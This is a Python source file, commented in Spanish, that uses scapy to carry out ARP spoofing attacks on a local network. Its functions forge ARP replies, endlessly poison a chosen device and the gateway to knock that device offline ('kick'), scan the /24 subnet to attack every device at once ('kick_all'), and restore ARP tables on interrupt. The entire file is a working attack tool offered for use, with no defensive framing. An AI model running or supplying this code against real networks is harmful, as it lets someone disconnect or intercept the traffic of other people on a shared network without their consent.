#!/usr/bin/env python3
# arp_operations.py
import time
import random
import scapy.all as scapy

from network_utils import get_mac, scan





def restore(dest_ip, source_ip, dest_mac=None, source_mac=None):
    """ Restaura las tablas ARP enviando paquetes ARP correctos """
    # Usa la MAC proporcionada si está disponible, de lo contrario, la obtiene
    dest_mac = dest_mac or get_mac(dest_ip)
    source_mac = source_mac or get_mac(source_ip)
    
    # Verifica que se hayan obtenido las MAC
    if not dest_mac or not source_mac:
        print(f"[!] No se pudo obtener MAC para IP {dest_ip} o {source_ip}")
        return
    
    # Crea un paquete ARP de respuesta con las direcciones correctas
    packet = scapy.ARP(
        op = 2,                         # Establece operación ARP como respuesta (op=2)
        pdst = dest_ip,                 # Define la IP del dispositivo destino
        hwdst = dest_mac,               # Asigna la MAC del dispositivo destino
        psrc = source_ip,               # Define la IP del dispositivo fuente
        hwsrc = source_mac              # Asigna la MAC del dispositivo fuente
    )
    
    # Envía el paquete ARP 4 veces para asegurar la restauración
    scapy.send(packet, count=4, verbose=True)


def spoof(target_ip, spoof_ip, target_mac=None):
    """ Envía un paquete ARP falso para suplantar una dirección IP """
    # Usa la MAC proporcionada si está disponible, de lo contrario, la obtiene
    target_mac = target_mac or get_mac(target_ip)
    
    # Verifica que se haya obtenido la MAC
    if not target_mac:
        print(f"[!] No se pudo obtener MAC para IP {target_ip}")
        return
    
    # Crea un paquete ARP de respuesta para realizar el spoofing
    packet = scapy.ARP(
        op = 2,                         # Establece operación ARP como respuesta (op=2)
        pdst = target_ip,               # Define la IP del dispositivo objetivo
        hwdst = target_mac,             # Asigna la MAC del dispositivo objetivo
        psrc = spoof_ip                 # Establece la IP que se quiere suplantar
    )
    
    # Envía el paquete ARP para realizar el spoofing
    scapy.send(packet, verbose=True)


def kick(target, gateway_ip):
    """ Realiza un ataque ARP para desconectar un dispositivo de la red """
    # Determina si el objetivo es una IP o una MAC
    target_ip = None
    target_mac = None
    if ":" in target:  # Si contiene ":", asume que es una MAC
        target_mac = target
        
        # Busca la IP correspondiente a la MAC escaneando la red
        ip_range = gateway_ip + "/24"
        devices = scan(ip_range)
        for device in devices:
            if device["mac"].lower() == target_mac.lower():
                target_ip = device["ip"]
                break
        if not target_ip:
            print(f"[!] No se encontró una IP asociada a la MAC {target_mac}")
            return
    else:  # Asume que es una IP
        target_ip = target
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"[!] No se pudo obtener la MAC para la IP {target_ip}")
            return
    
    print(f"[+] Comenzando ataque ARP intenso contra {target_ip} (MAC: {target_mac})")
    
    # Bucle infinito para enviar paquetes ARP continuamente
    try:
        while True:
            # Engaña al objetivo haciéndole creer que el atacante es el router
            spoof(target_ip, gateway_ip, target_mac)
            
            # Engaña al router haciéndole creer que el atacante es el objetivo
            spoof(gateway_ip, target_ip)
            
            # Genera un intervalo aleatorio corto para enviar paquetes
            aaf = random.uniform(0.01, 0.001)
            time.sleep(aaf)
            print(f"AAF (Aleatorización de Alta Frecuencia): {aaf}")
    except KeyboardInterrupt:
        print("\n[!] Restaurando tablas ARP...")
        restore(target_ip, gateway_ip, target_mac)
        restore(gateway_ip, target_ip)
        print("[+] Restauración completa.")


def kick_all(gateway_ip):
    """ Realiza un ataque ARP masivo contra todos los dispositivos en la red """
    print("[*] Escaneando red para desconectar todos los dispositivos...")
    ip_range = gateway_ip + "/24"
    devices = scan(ip_range)
    
    # Filtra el gateway y almacena todos los objetivos válidos
    targets = [
        {"ip": d["ip"], "mac": d["mac"]}
        for d in devices
        if d["ip"] != gateway_ip
    ]
    
    if not targets:
        print("[-] No se encontraron dispositivos para desconectar.")
        return

    print(f"[+] Objetivos encontrados: {len(targets)}")
    print("[+] Comenzando ataque ARP masivo...")
    
    try:
        while True:
            for t in targets:
                spoof(t["ip"], gateway_ip, t["mac"])
                spoof(gateway_ip, t["ip"])
            aaf = random.uniform(0.01, 0.001)
            time.sleep(aaf)
            print(f"AAF (Aleatorización de Alta Frecuencia): {aaf}")
    except KeyboardInterrupt:
        print("\n[!] Interrupción detectada. Restaurando tablas ARP...")
        for t in targets:
            restore(t["ip"], gateway_ip, t["mac"])
            restore(gateway_ip, t["ip"])
        print("[+] Restauración completa.")